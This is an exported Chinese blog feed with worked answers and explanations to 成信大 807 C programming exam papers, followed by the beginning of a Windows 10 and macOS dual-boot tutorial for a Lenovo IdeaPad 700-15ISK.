对C语言程序进行编译时，可以找出程序的语法错误和注释中的拼写错误答案：×解析：编译时可以找出语法错误是正确的，但是对于注释，编译器是忽略的，也就是说编译器看都不会看注释里面的内容，更不可能检查出注释里面的拼写错误 break语句仅能在switch语句中使用答案：×解析：break语句可以在循环语句或者switch语句中使用，而continue语句只能在循环语句中使用 在C语言中，数组名代表数组中下标为0的元素的值答案：×解析：数组名代表数组首地址，不代表下标为0的元素的值 C语言允许程序员自己建立由不同类型数据组成的组合型的数据结构,称为结构体答案：√ 在C语言中，字符串是用单引号括起来的零到多个字符答案：×解析：字符串是用双引号括起来的零到多个字符 C语言中数组名是一个地址常量，表示数组在内存中的起始地址答案：√解析：数组名是一个地址常量（所以不能作为左值，拓展一下左值，放在赋值运算符左边的值），表示数组在内存中的起始地址，起始地址就是首地址的意思 程序分析题 描述程序主要功能，写出程序运行结果12345678910111213141516171819#include&lt;stdio.h&gt;int main()&#123; int a,b,c,temp; printf("Please input 3 integers:\n"); scanf("%d%d%d",&amp;a,&amp;b,&amp;c); if (a &lt; b) &#123; temp = a; a = b; b = temp; &#125; if (a &lt; c) printf("%d %d %d",c,a,b); else if (c &gt; b) printf("%d %d %d",a,c,b); else printf("%d %d %d",a,b,c); return 0; &#125; 程序运行时，从键盘输入三个数据56 67 48答案： 功能：输入三个整数，按降序输出 输出结果：67 56 48 描述程序主要功能，写出程序运行结果1234567891011121314#include&lt;stdio.h&gt;struct student&#123; char name[20]; float score1; float score2;&#125;;void main()&#123; struct student a[2]=&#123;&#123;"Zhangwei",100,70&#125;,&#123;"Wangfeng",70,80&#125;&#125;,*p; p = a; printf("name: %s total=%f\n",p-&gt;name,p-&gt;score1+p-&gt;score2); printf("name: %s total=%f\n",a[1].name,a[1].score1+a[1].score2);&#125; 答案： 功能：输出结构体数组a中每个元素的name（名字）和total（总分） 输出结果：12name: Zhangwei total=170.000000name: Wangfeng total=150.000000 描述程序主要功能，写出程序运行结果1234567891011121314151617181920#include&lt;stdio.h&gt;int main()&#123; int i,j,a[3][5],max,m,n; printf("Please input 15 integers:\n"); for (i = 0;i &lt; 3;i++) for (j = 0;j &lt; 5;j++) scanf("%d",&amp;a[i][j]); max = a[0][0]; for (i = 0;i &lt; 3;i++) for (j = 0;j &lt; 5;j++) if (max &lt; a[i][j]) &#123; max = a[i][j]; m = i; n = j; &#125; printf("a[%d][%d]=%d\n",m,n,max); return 0;&#125; 程序运行时，输入45 67 32 46 77 65 34 23 84 71 83 92 34 51 48 答案： 功能：输出输入的15个数字中的最大值，以及最大值对应数组中的下标 输出结果：a[2][1]=92 程序设计题 输入一行字符，分别统计出其中英文字母、空格、数字和其它字符的个数，以回车表示输入结束，最后在屏幕上显示统计结果答案： 1234567891011121314151617181920#include&lt;stdio.h&gt;int main()&#123; int letter,space,number,other; char ch; letter = space = number = other = 0; printf("Please input strings:\n"); do&#123; ch = getchar(); if ((ch &gt;= 'a' &amp;&amp; ch &lt;= 'z') || (ch &gt;= 'A' &amp;&amp; ch &lt;= 'Z')) letter++; else if (ch == ' ') space++; else if (ch &gt;= '0' &amp;&amp; ch &lt;= '9') number++; else other++; &#125;while(ch != '\n'); printf("letter:%d,space:%d,number:%d,other:%d\n",letter,space,number,other); return 0;&#125; 观察并发现下面图形的规律，使用循环语句编写程序，输出该图形 1234567* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 答案： 1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;#define N 7#define M 3void printOneLine(int n)&#123; int i = 0; for (;i &lt; n;i++) &#123; printf("* "); &#125; printf("\n");&#125;int main()&#123; int i,j; for (i = 0;i &lt; N;i++) &#123; for (j = 0;j &lt; i * M;j++) &#123; printf(" "); &#125; printOneLine(N); &#125; return 0;&#125; 编写程序，输入下列学生成绩表中的数据，采用结构体数组存放，输出平均分最高的学生的所有信息 name语文数学外语 zhao97.569.078.0 qian80.093.087.5 sun75.089.568.5 li72.568.554.0 答案： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include&lt;stdio.h&gt;#define N 4struct student&#123; char name[20]; float chinese; float math; float english; float average;&#125;;void input(struct student *s)&#123; printf("Please input name:"); scanf("%s",s-&gt;name); printf("Please input chinese score:"); scanf("%f",&amp;s-&gt;chinese); printf("Please input math score:"); scanf("%f",&amp;s-&gt;math); printf("Please input english score:"); scanf("%f",&amp;s-&gt;english); float sum = s-&gt;chinese + s-&gt;english + s-&gt;math; s-&gt;average = sum / 3;&#125;struct student* findMax(const struct student *a,int n)&#123; struct student *max = a; int i = 0; for (;i &lt; n;i++) &#123; if (max-&gt;average &lt; (a + i)-&gt;average) &#123; max = a + i; &#125; &#125; return max;&#125;void print(const struct student *a)&#123; printf("name:%s,chinese:%.2f,math:%.2f,english:%.2f,average:%.2f\n",a-&gt;name,a-&gt;chinese,a-&gt;math,a-&gt;english,a-&gt;average);&#125;int main()&#123; struct student a[N],*max; int i,n; printf("Please input n(integer,no more than %d):",N); scanf("%d",&amp;n); getchar(); for (i = 0;i &lt; n;i++) &#123; printf("Please input No.%d student information:\n",i + 1); input(&amp;a[i]); &#125; max = findMax(a,n); printf("The information of the student who has the highest average score as follow.\n"); print(max); return 0;&#125;]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[成信大807程序综合设计2016年真题答案以及解析]]></title>
    <url>%2Fposts%2F21179a62%2F</url>
    <content type="text"><![CDATA[单项选择题 下面不正确的字符串常量是A. ‘abc’B. “1212”C. “0”D. “ “答案：A解析：字符串常量应该由双引号括起来 判断char型变量ch是否为大写字母的正确表达式是A. ‘A’ &lt;= ch &lt;= ‘Z’B. (ch&gt;=’A’) &amp; (ch&lt;=’Z’)C. (ch&gt;=’A) &amp;&amp; (ch&lt;=’Z’)D. (‘A’ &lt;= ch) AND (‘Z’ &gt;= ch)答案：C解析：A选项连用关系运算符将导致不同的含义；B选项&amp;代表位运算，按位与；D选项范围和AND是错误的 若有说明: int a[][3]={1,2,3,4,5,6};，则a数组第一维的大小是A. 2B. 3C. 4D. 无确定值答案：A解析：初始化列表中给出了六个元素，而数组声明中给了第二维的大小是3，所以前三个初始化第一行，后三个初始化第二行，总共两行，于是选A，如果语句改为int a[][3]={1,2,3,4,5,6,7};，那么将会声明出一个3x3的数组，第一行值为1,2,3，第二行值为4,5,6，第三行值为7,0,0 下列可作为C语言赋值语句的是A. x = 3,y = 5;B. a = b = 6C. i--;D. y = int(x);答案：A解析：B选项错在没有分号，不能算作语句，另外只有已经声明过的变量才可以连续赋值，变量在声明时不能连续赋值；C选项，++、--不算做赋值运算；D选项错在强制类型转换 C语言中，while和do-while循环的主要区别是A. do-while 的循环体至少无条件执行一次B. while 的循环控制条件比do-while的循环控制条件更严格C. do-while 允许从外部转到循环体内D. do-while 的循环体不能是复合语句答案：A解析：此题考查do-while和while循环的区别，答案显而易见是A；B选项纯粹胡扯；C选项，goto语句可以跳到打了标记的任何位置，跟循环体没有关系；D选项纯属胡扯 若有语句: int a[5],p=a; ，则对a数组元素首地址的正确引用是A. &amp;p+5B. **a+1C. &amp;*a+3D. \(a+0)答案：D解析：A选项指向数组最后一个元素的后一个位置；B选项非法；C选项指向a[3]位置，D选项需要理解一下a数组元素首地址的正确引用这个概念了，地址的引用，其实就是该地址存放的那个变量名，所以这题目就是在问哪个选项能够表示a[0]，emmm，感觉有点强行解释 若有语句: int pl,m;，以下为正确赋值语句的选项是A. pl = m;B. pl = &m;C. pl = *m;D. pl = &amp;m;答案：B解析：给指针变量赋值需用&amp;变量名 说明一个结构体变量时，系统分配给它的内存是A.各成员所需内存量的总和B.结构中第一个成员所需内存量C.成员中占内存最大者所需的容量D.结构中最后一个成员所需内存量答案：A解析：参考书上是这么讲的；但是实际上，这里会有内存对齐的坑，但是不考所以可忽略，但是做学术的人呢，还是有必要了解一下的，所以关于内存对齐的内容留给各位自行拓展 以下正确的函数形式是A. double fun(int x, int y){ z=x+y; return z;}B. fun(int x, y){ int z;return z;}C. fun(x, y){ int x, y; double z;z=x+y;return z;}D. double fun(int x, int y){ double z;z=x+y;return 2;}答案：D解析：A选项错在变量z没有定义；B选项错误有点多，函数没有返回值类型、形参的定义搞成了变量的定义；C选项简直就是胡拼乱凑 C程序一定会有的函数是A. mianB. mainC. printfD. scanf答案：B解析：main函数是C程序的入口，必须有 判断题 for循环的三个表达式可以任意省略，while, do-while 中的表达式也是如此答案：×解析：有关for语句的说法是对的，其他的是错误的 一个C语言源程序文件中主函数有且仅有一个答案：√解析：说法正确，但是如果在一个工程中，可能存在多个源程序文件，这时候只能有一个源程序文件中有main函数，有且仅有一个 二维数组可以这样定义: int a[3,4]答案：×解析：正确的写法应该是int a[3][4] C语言的应用比较广泛，不仅可用来编写应用软件，而且可用来编写系统软件答案：√解析：Linux操作系统中的应用软件都是使用C语言编写的，操作系统的内核部分大部分是由C/C++编写的，因此具有很高的性能 函数必须有参数答案：×解析：函数可以无参，通常main函数是无参的，但是main函数也可以带有参数 结构体成员的类型必须是基本数据类型答案：×解析：通常，结构体的成员的类型是基本数据类型，但是结构体的成员可以是其他类型，比如指针类型，如链表，结构体的成员还可以是另一个结构体类型 判断一个变量是否为“真”时，以0代表“假”，以非零代表“真”答案：√解析：说法正确，拓展，一个逻辑（关系）表达式的结果只有两种，1代表真，0代表假，如3 &gt; 2这个表达式的结果是1，代表真 内存中的每个存储单元都有一个唯一的地址答案：√解析：地址分为两类，一类是逻辑地址，另一个类是物理地址，内存中每个存储单元都有一个唯一的地址，这里的地址指物理地址，唯一，所以说法正确 假设有char a[10]=”abc”;，则strlen(a)的值为3答案：√解析：strlen函数返回字符串的长度，不包括末尾的’\0’ continue不是结束本次循环，而是终止整个循环的执行答案：×解析：break，跳出循环，即终止本层循环的执行；continue只是结束本次循环 程序分析题 描述程序的主要功能，并写出程序的运行结果1234567891011121314151617#include&lt;stdio.h&gt;int main()&#123; int a,b,result; char op; scanf("%d%c%d",&amp;a,&amp;op,&amp;b); switch(op) &#123; case '+':result = a + b;break; case '-':result = a - b;break; case '*':result = a * b;break; case '/':if (b != 0) result = a / b;break; default:result = 0; &#125; printf("%d %c %d = %d",a,op,b,result); return 0;&#125; 输入数据： 12+120 60/3 答案： 功能：对输入的整数四则运算式进行运算并输出，其中如果除数为0，或者运算符不是加减乘除，则运算结果为0 输出结果： 12 + 120 = 132 60 / 3 = 20 描述程序的主要功能，并写出程序的运行结果12345678910111213141516171819202122#include&lt;stdio.h&gt;int main()&#123; int n,i,j,num[20],tmp; printf("Please input n:"); scanf("%d",&amp;n); printf("Please input %d num:",n); for (i = 0;i &lt; n;i++) scanf("%d",&amp;num[i]); for (i = 0;i &lt; n;i++) for (j = 0;j &lt; n - 1;j++) if (num[j] &gt; num[j + 1]) &#123; tmp = num[j]; num[j] = num[j + 1]; num[j + 1] = tmp; &#125; printf("Output:"); for (i = 0;i &lt; n;i++) printf("%d ",num[i]); return 0;&#125; Please inputn: 10Please input 10 num: 49 32 61 97 76 13 27 38 55 86Output: 答案： 功能：输入一个不超过20的数字n作为数组的大小，然后输入n个数字，对这组数字进行冒泡排序，最后升序输出 运行结果：13 27 32 38 49 55 61 76 86 97 描述程序的主要功能，并写出程序的运行结果（这题有错，我修改了一下代码）123456789101112131415161718#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; int i = 0; char str[100]; printf("Please input string:"); gets(str); while (str[i] != '\0') &#123; if (('a' &lt;= str[i]) &amp;&amp; (str[i] &lt;= 'z')) str[i] = str[i] - 'a' + 'A'; i++; &#125; printf("Output:"); puts(str); return 0;&#125; 程序输入:Please input string: Introduction of C++ LanguageOutput: 答案： 功能：输入一个不超过100个字符的字符串，将该字符串中所有小写字母转换为大写字母后输出 运行结果：Output:INTRODUCTION OF C++ LANGUAGE 程序设计题 从键盘输入一个整数的百分制成绩，用变量score存储，如果score不在0-100范围内，则输出”Error Input!”,并结束程序。否则，将输入的数据转换成等级’A’，’B’, ‘C, ‘D’,’E’。 90分以上为’A’，8089分为’B’，7079分为’C’，60~69分为’D’，60分以下为E’，结果赋值给变量grade，并将变量score 和grade的值输出到屏幕上答案： 1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int score = 0,grade = 0; printf("Please input score:"); scanf("%d",&amp;score); if (score &lt; 0 || score &gt; 100) &#123; printf("Error input!\n"); exit(0); &#125; int tmp = score / 10; switch(tmp) &#123; case 10: case 9:grade = 'A';break; case 8:grade = 'B';break; case 7:grade = 'C';break; case 6:grade = 'D';break; default:grade = 'E'; &#125; printf("Output:"); printf("score:%d\tgrade:%c",score,grade); return 0;&#125; 从键盘输入一个可带空格的字符串，判断该字符串是否是回文(回文指正向读与逆向读相同的字符串，如abcddcba或abcba等)。如果字符串是回文，输出”Yes”， 否则输出”No”答案： 12345678910111213141516171819202122#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int main()&#123; int i,len; char str[100]; printf("Please input string:"); gets(str); len = strlen(str); printf("Output:"); for (i = 0;i &lt; len;i++) &#123; if (str[i] != str[len - i - 1]) &#123; printf("No\n"); exit(0); &#125; &#125; printf("Yes\n"); return 0;&#125; 从键盘上输入矩阵的阶数n(n&lt;5),再输入矩阵的各个数据元素，计算阵的对角线元素之和sum。按照下面格式输出该矩阵和sum的值例如n=3时，矩阵为:1 3 63 6 96 9 12sum = 19答案： 12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;#define N 5int main()&#123; int n,i,j,sum = 0; int a[N][N]; printf("Please input n:"); scanf("%d",&amp;n); printf("Please input array a[%d][%d] , total %d integers:\n",n,n,n*n); for (i = 0;i &lt; n;i++) &#123; for (j = 0;j &lt; n;j++) &#123; scanf("%d",&amp;a[i][j]); if (i == j) &#123; sum += a[i][j]; &#125; &#125; &#125; printf("Output:\n"); for (i = 0;i &lt; n;i++) &#123; for (j = 0;j &lt; n;j++) &#123; printf("%d ",a[i][j]); &#125; printf("\n"); &#125; printf("sum = %d",sum); return 0;&#125;]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[成信大807程序综合设计2015年真题答案以及解析]]></title>
    <url>%2Fposts%2F23c99d45%2F</url>
    <content type="text"><![CDATA[填空题 已知x为整数，x等于5，则表达式x%2的值是__答案：1；解析：5对2取模运算，值为1 文本文件(文件名为test1.txt)和二进制文件(文件名为test2.dat)。能用Windows的记事本将该文件内容显示在屏幕上的文件是__答案：test1.txt；解析：记事本只能正常打开文本文件，如果强行打开二进制文件，会乱码 下面程序中，主函数调用了FindMax函数，找出数组中的最天值 123456789101112131415161718192021222324#include&lt;stdio.h&gt;#define N 3#define M 4______void main()&#123; int x[N][M] = &#123;1,5,7,4,2,6,4,3,8,2,3,1&#125;; int max; ______ printf("The max value is %d\n",max);&#125;int FindMax(int x[N][M])&#123; int i,j; int max; max = x[0][0]; for (i = 0;i &lt; N;i++) &#123; for (j = 0;j &lt; M;j++) if (max &lt; x[i][j]) max = x[i][j]; &#125; ______&#125; 答案： int FindMax(int x[N][M]); max = FindMax(x); return max; 解析： 主函数里面要调用函数，需要在之前对函数进行声明，所以直接把下面函数定义的函数头拿过来，然后后面加上分号即可，如果函数定义在主函数之前，则可以不必声明。 下一行在输出max，不难想到，这里是对max进行赋值，即调用FindMax函数，然后把返回值赋值给max 可以看到FindMax已经把主体功能完成了，即把最大值通过打桩的算法存放在了max变量中，但是这个函数缺少返回值，于是答案就很明显了 下面程序的功能是:输出字符数组a中下标为偶数的元素 123456789101112#include&lt;stdio.h&gt;#include&lt;string.h&gt;void main()&#123; char a[] = "clanguage"; int i,k; k = strlen(a); puts(a); for (i = 0;i &lt; k;i += 2) ______ printf("\n");&#125; 答案：printf(&quot;%c&quot;,a[i]); 解析：for循环已经帮我们控制好了条件，所以只需要挨个输出字符就好，注意：这里如果填putchar(a[i]);也是正确的 C语言中基本数据类型包括整型、实型、__答案：字符型 语句块t=a;a=b;b=t;的功能是__答案：交换变量a、b的值；解析：经典的变量交换方法 以下程序功能是:已知第1人是10岁，第2人比第1人大2岁，第3人比第2人大2岁，以此类推，求第n个人的年龄，请按题意要求填空完善程序 1234567891011121314#include&lt;stdio.h&gt;int age(int n)&#123; int c; if (n == 1) c = 10; ______ return c;&#125;void main()&#123; int n; scanf("%d",&amp;n); printf("%d\n",______);&#125; 答案： c = 2 + age(n - 1); age(n) 解析： 此题明显是递归，因为题目给出了一个递推关系，即第n个人的年龄=第n-1个人的年龄+2和一个出口条件，即第一个人的年龄是10；根据这种递推关系，我们可以很轻松的写出简洁的代码，按题意很显然n是正整数，但此题有问题（不严谨），如果用户输入的n &lt; 1那么就会进入死递归，所以我把答案修改了一下，变成c = n &lt;= 0 ? 10 : 2 + age(n - 1);另外，还可以利用数学归纳法（本质上此题是一个等差数列求第n项）解此题 123456第 1 个人的年龄 = 10第 2 个人的年龄 = 第 1 个人年龄 + 2 = 12 = 10 + 2 * 1 第 3 个人的年龄 = 第 2 个人年龄 + 2 = 14 = 10 + 2 * 2...第 n 个人的年龄 = 10 + 2 * (n - 1)于是答案为：c = 10 + 2 * (n - 1); 输出函数返回的结果即可算出第n个人的年龄 若有以下定义和语句char *s1=&quot;12345&quot;， *s2=&quot;1234&quot;;printf(&quot;%d\n&quot;, strlen(strcpy(s1,s2));则输出结果是__答案：运行错误，尝试修改字符串常量地址区解析：char *s1 = “xxx”;代表声明一个字符指针，这个指针指向地址中的常量单元也就是不可修改的单元，这一片单元中所存放的内容是“xxx\0”，不过虽然内存中的值不能修改，但是可以修改s1指针的指向，这个就是和字符数组最大的区别，前者可以修改指向，不能修改内存中的内容，后者不能修改指向，但可以修改内存中的内容 以下程序的运行结果是__ 123456789101112#include&lt;stdio.h&gt;struct stu_score&#123; char c_language; char math; char english;&#125;;int main()&#123; struct stu_score student; printf("%d\n",sizeof(student)); return 0;&#125; 答案：3；解析：结构体类型所占用的空间是结构体成员所占用空间之和，所以这个题是三个char类型变量所占用的空间加起来，结果是3 程序改错题 以下程序功能是将分配的内存地址输出 1234567891011121314151617#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; /*********Found (1) ***********/ char p_str[2]; /*********Found (2) ***********/ if (p_str = (char*)malloc(100)==NULL) &#123; printf("malloc memory fail!\n"); return 1; &#125; printf("%o\n",p_str); /*********Found (3) ***********/ close(p_str); return 0;&#125; 答案： char *p_str; if ((p_str = (char*)malloc(100))==NULL) free(p_str); 解析： 数组名是指针常量，修改指针常量的指向是非法的，所以应该改为字符指针 赋值运算符的优先级很低，如果不加括号改变优先级的话，结果将会是先运算(char*)malloc(100)==NULL这个表达式，这是个逻辑表达式，值只可能是0或者1，然后再将这个运算好的结果赋值给p_str字符指针，显然是不合法的 malloc函数申请的地址在程序运行结束之前应当交给系统回收，对应的函数是free，而不是close 从一个子函数中输入结构体信息并在主函数中输出 12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;struct person&#123; int a; double b;&#125;;/*********Found (4) ***********/void input(struct person x);int main()&#123; struct person y; /*********Found (5) ***********/ input(y); printf("%d %f\n",y.a,y.b); return 0;&#125;/*********Found (6) ***********/void input(struct person x)&#123; char tmp[10]; printf("请输入整型数a："); gets(tmp); x-&gt;a=atoi(tmp); printf("请输入单精度数b："); gets(tmp); x-&gt;b=atof(tmp);&#125; 答案： void input(struct person *x); input(&amp;y); void input(struct person *x) 解析： 在不同的函数中声明的变量叫做局部变量，这些局部变量的有效作用范围只在本函数从声明的地方开始，到本函数结束的地方，于是如果想在其他函数中操作在主函数中声明的某个变量，只能通过传递指针的方式，而函数调用中，有两个比较关键的概念，形参和实参，形参是函数声明里面的变量，而实参是函数调用中实际传递变量或者常量，所以这里形参的参数应该是指针类型，调用的时候传递过去的实参应该是一个地址类型的值 由上一个解析可知，调用的时候应当传递地址值 -&gt;操作符只能是指针类型使用，所以形参应当是一个指针 程序功能:计算1/1+ 1/2+…+ I/N之和并显示 123456789101112131415#include&lt;stdio.h&gt;#define N 2int main()&#123; /*********Found (7) ***********/ int result = 0; int fac; for (fac = 1;fac &lt;= N;fac++) &#123; /*********Found (8) ***********/ result += 1.0/2; &#125; printf("%8.6f\n",result); return 0;&#125; 答案： float result = 0.0; result += 1.0/fac; 解析： 此题明显是计算调和级数之和，而调和级数除了第一项是1之外，每一项都是小于1的浮点数，所以调和级数之和应该保存在浮点型变量中，另外，输出语句使用%8.6f也暗示了这一点 result += 1.0/2，这语句的意思是每次循环result都加1.0/2，这个不是调和级数，正确答案应该是result第一次1.0/1，第二次+1.0/2，第3次+1.0/3，，，第n次+1.0/n 程序功能是每行输出5个*，共输出5行 12345678910111213#include&lt;stdio.h&gt;#define N 5int main()&#123; /*********Found (9) ***********/ double i; for (i = 1;i &lt;= N;i++) &#123; /*********Found (10) ***********/ printf("*****"); &#125; return 0;&#125; 答案： int i; printf(&quot;*****\n&quot;); 解析： 一般情况下，控制for循环执行次数的变量应当是整型 换行 分析程序题 写出以下程序的功能及运行结果 123456789101112#include&lt;stdio.h&gt;void main()&#123; int j; int a[6]=&#123;12,4,17,24,27,16&#125;,b[6]=&#123;27,1,4,25,23,16&#125;; for (j = 0;j &lt; 6;j++) &#123; if(a[j] == b[j]) break; printf("%d ",a[j]); &#125; printf("\n");&#125; 答案： 功能：比较a，b两数组对应位置的元素，如果相等，跳出，否则输出a数组该位置的元素 运行结果：12 4 17 24 27 解析：此题出题老师，故意在if语句处打了个缩进想误导大家，注意：if语句，for语句，如果后面没有花括号，起作用的是其后第一条实际语句 写出以下程序的功能 123456789101112131415161718#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;void main()&#123; char *str[10],*str1;int i,j; for (i = 0;i &lt; 10;i++) &#123; str[i] = (char *)malloc(20); gets(str[i]); &#125; for (i = 0;i &lt; 9;i++) for(j = 0;j &lt;= 8 - i;j++) if(strcmp(str[j],str[j+1])&gt;0) str1=str[j],str[j]=str[j+1],str[j+1]=str1; for (i = 0;i &lt; 10;i++) puts(str[i]); &#125; 答案：从键盘输入10个字符串，排序后升序输出解析：经典的字符串冒泡排序算法，升序和降序看strcmp(str[j],str[j+1])是大于0还是小于0（大于等于或者小于等于也可以），此题是大于0代表前项比后项大，后面做的操作是交换两个字符指针的指向，所以前项会一直比后项小，即升序 算法设计及编程题 输入一行字符，统计其中英文单词的个数。单词之间以空格为间隔。答案： 12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; char str[100]; gets(str); int i = 0,cnt = 0; // 不考虑最前面的空格 while (str[i] == ' ')&#123; i++; &#125; for (;str[i]!='\0';i++) &#123; if (i &gt; 0 &amp;&amp; str[i - 1] == ' ' &amp;&amp; str[i] != ' ') &#123; cnt++; &#125; &#125; if (str[0] != '\0' &amp;&amp; str[0] != ' ') &#123; cnt++; &#125; printf("%d\n",cnt); return 0;&#125; 流程图： 输入10个雇员的信息(姓名，工资号)，按工资号排序输出。要求雇员的信息用结构体，用两个函数分别完成10个雇员信息的输入及排序。答案： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define N 10struct employer&#123; int num; char name[N];&#125; employers[N];void input()&#123; int i = 0; for (;i &lt; N;i++) &#123; printf("请输入工资号："); scanf("%d",&amp;employers[i].num); getchar(); printf("请输入姓名："); scanf("%s",employers[i].name); &#125;&#125;void sort()&#123; struct employer tmp; int i = 0,j = 0; for (;i &lt; N - 1;i++) &#123; for (j = i + 1;j &lt; N;j++) &#123; if (employers[i].num &gt; employers[j].num) &#123; tmp = employers[i]; employers[i] = employers[j]; employers[j] = tmp; &#125; &#125; &#125;&#125;int main()&#123; int i = 0; input(); sort(); for (;i &lt; N;i++) &#123; printf("%d %s\n",employers[i].num,employers[i].name); &#125; return 0;&#125; 流程图：略，算法写出来，流程图直接画就可以了，参考上一题和我的博客807笔记 请编写函数char *fun(char *str,int m),实现将输入的字符串每个字符“循环左移”m位。例如，输入“ABCDE”，则循环左移2位应输出“CDEAB”，若输入“1234567”，则循环左移3位输出“4567123”。 在主函数中实现输入，调用函数fun,然后输出。 12345678910111213141516171819202122#include&lt;stdio.h&gt;#include&lt;string.h&gt;char *fun(char *str,int m)&#123; ......&#125;void main()&#123; char s[100]; int m; printf("Please input string:"); scanf("%s",s); printf("Enter m:"); scanf("%d",&amp;m); if (m &gt; strlen(s)) &#123; printf("\nData error.\n"); return; &#125; printf("Result is:%s\n",fun(s,m));&#125; 答案： 12345678910111213141516char *fun(char *str,int m)&#123; char *result = str; while (m-- &gt; 0) &#123; char tmp = str[0]; int i = 1; while (str[i] != '\0') &#123; str[i - 1] = str[i]; i++; &#125; str[i - 1] = tmp; &#125; return result;&#125; 流程图：略 编写程序，从键盘输入一串以“#”为结束符的字符串，并写入文本文件file.txt 中。答案： 123456789101112131415161718#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; FILE *fp = fopen("file.txt","w"); if (fp) &#123; char c = getchar(); while(c != '#') &#123; fprintf(fp,"%c",c); c = getchar(); &#125; fclose(fp); &#125; return 0;&#125; 流程图：略]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[联想IdeaPad 700-15ISK win10 黑苹果双系统教程]]></title>
    <url>%2Fposts%2Fad76eda8%2F</url>
    <content type="text"><![CDATA[说明 本文针对联想IdeaPad 700-15ISK，但是方法适用于所有机型装黑苹果双系统，差的仅仅是一个适合你机型的EFI，本人小白，不太会配置EFI，所用EFI为网络上搜集而来的，我只做了小小的修改和优化 电脑配置 电脑型号 联想 80RU操作系统 Microsoft Windows 10 专业版 (64位)CPU (英特尔)Intel(R) Core(TM) i5-6300HQ CPU @ 2.30GHz(2304 MHz)主板 联想 Lenovo ideapad 700-15ISK内存 12.00 GB (2133 MHz)硬盘1 130 GB (SAMSUNG MZVLV128HCGR-000L2)硬盘2 500 GB (希捷 ST500LT012-1DG142)显卡1 Intel(R) HD Graphics 530显卡2 NVIDIA GeForce GTX 950M显示器 京东方 BOE HF 32位真彩色 60Hz声卡1 Realtek High Definition Audio声卡2 英特尔(R) 显示器音频网卡1 Intel(R) Dual Band Wireless-AC 3165网卡2 Realtek PCIe GbE Family Controller 准备阶段 16G USB3.0 U盘 x1 镜像，推荐 黑果小兵的10.14.6镜像，小问题较少，适合使用 黑果小兵的10.14.2镜像，基本没什么问题，适合使用 黑果小兵的10.13.6镜像，小问题较多，不推荐使用 工具软件 DiskGenius：调整硬盘分区，挂载分区，备份还原硬盘分区等 EasyUEFI：调整启动项 explorer++：复制文件到efi分区 balenaEtcher：刻录安装镜像到U盘 winmd5free：校验md5，验证镜像文件完整性 WePE：建立PE方便救砖和调整分区大小 所有工具已打包好，点击使用百度网盘下载，提取码：bf5m EFI文件，提取码：3wcx 安装教程正式开始下载相关工具到本地，并安装有的工具是绿色版，解压即可用，有的工具需要安装，安装过程一路默认下一步即可 校验镜像md5 打开winmd5free 选择你要校验的镜像 计算完成后，将校验码（校验码在黑果小兵的博客上可以找到）粘贴到第二个框，点击verify校验 如果Matched！说明没问题，否则说明文件可能损坏，需要重新下载 刻录镜像到U盘（建议操作前先退出电脑管家） 插入U盘 打开balenaEtcher 点击Select image，选择本地下载好的macos镜像文件 点击flash，开始刻录 耐心等待镜像文件刻录完成 偶尔会弹出格式化驱动器，叉掉即可 叉掉后显示驱动器不可用，同样不管它，继续叉掉 刻录成功 关闭balenaEtcher 拔出U盘 win10或者PE下调整硬盘分区 打开DiskGenius，查看主硬盘分区格式，一定要是GPT 如果不是GPT，选中硬盘然后鼠标右键，选择转换分区表类型为GUID格式，然后去PE使用相关工具修复一下Windows的引导（此过程不再赘述，不会操作请自行百度） 检查ESP分区的大小，建议至少300兆 如果你的ESP分区不够300兆 先备份ESP分区到镜像文件，选中ESP分区，右键选择备份到镜像文件 然后删掉ESP分区 选中空闲分区，右键选择建立ESP/MSR分区 设置ESP分区大小为300兆，点击确定 选中新建立的ESP分区，右键选择从镜像文件还原分区 主硬盘预留60G左右用来装黑苹果，建议安装在固态硬盘上，如果你的固态全是C盘，那么你需要使用DiskGenius或者傲梅分区助手之类的软件，去无损调整你的C盘容量，此操作比较简单，百度教程极多，在此不再赘述 将刚才预留的60G左右的分区格式化为NTFS格式，选中空闲分区，鼠标右键建立新分区即可，确认之后，保存更改，自动提示格式化为NTFS 复制CLOVER到系统ESP分区 打开DiskGenius 选中主硬盘的ESP分区，鼠标右键，指派新的驱动器号（盘符） 记住指定的盘符，我这里是H盘，点击确定 找到explorer++，右键以管理员的身份打开 打开刚才挂载的H盘，展开EFI文件夹 找到CLOVER文件夹复制到EFI文件夹下 将CLOVER复制到EFI文件夹下,选中CLOVER文件夹，右键复制，到EFI分区下右键点击Paste（粘贴） 操作完成之后的截图 修改启动项 打开EasyUEFI 点击创建新项 填好相关信息，然后点击浏览 选中CLOVERx64.efi，点击确定 再次确认 调整启动顺序，将CLOVER放在最上面，选中CLOVER，鼠标点击上移键，建议一次次点，有一点卡，不要快速的连续点击 完成，可以看到CLOVER已经在最上面了 安装黑苹果 插入U盘，然后重启电脑，会自动进入CLOVER引导 选择Boot macOS Install from Install macOS Mojave 加载中 